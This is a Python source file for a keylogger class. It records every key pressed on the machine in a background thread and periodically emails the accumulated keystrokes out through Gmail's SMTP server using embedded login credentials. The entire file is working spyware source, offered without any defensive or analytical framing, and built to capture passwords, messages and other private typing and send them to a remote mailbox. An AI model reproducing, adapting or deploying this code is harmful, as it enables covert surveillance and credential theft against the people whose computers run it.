import smtplib
import threading
from keyboard import read_event


class KeyLogger:
    def __init__(self, time_interval, email, password):
        """Initialize the KeyLogger."""
        self.interval = time_interval
        self.log = "KeyLogger has started...\n"
        self.email = email
        self.password = password
        self.server = None  # Placeholder for SMTP server connection

    def connect_to_smtp(self):
        """Establish an SMTP connection."""
        try:
            self.server = smtplib.SMTP('smtp.gmail.com', 587)
            self.server.starttls()
            self.server.login(self.email, self.password)
            print("Connected to SMTP server.")
        except Exception as e:
            print(f"Failed to connect to SMTP server: {e}")
            self.server = None

    def send_email(self):
        """Send the log via email."""
        try:
            if not self.server:  # Establish connection if not already connected
                self.connect_to_smtp()
            if self.server:  # Send email only if the connection was successful
                self.server.sendmail(self.email, self.email, self.log)
                print("Log sent successfully.")
        except Exception as e:
            print(f"Error sending email: {e}")
        self.log = ""  # Clear the log after sending

    def close_smtp_connection(self):
        """Close the SMTP connection gracefully."""
        if self.server:
            self.server.quit()
            print("SMTP connection closed.")
            self.server = None

    def capture_keystrokes(self):
        """Capture and log keystrokes."""
        while True:
            event = read_event(suppress=False)  # Allow keys to function normally
            if event.event_type == "down":  # Log only when a key is pressed
                if event.name == "space":
                    self.log += " "  # Add space for spacebar
                elif event.name == "enter":
                    self.log += "\n"  # Add newline for Enter key
                else:
                    self.log += event.name  # Add key name to log

    def report(self):
        """Send the log via email periodically."""
        self.send_email()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        """Start the keylogger."""
        try:
            threading.Thread(target=self.capture_keystrokes, daemon=True).start()
            self.report()
        finally:
            self.close_smtp_connection()  # Ensure the SMTP connection is closed
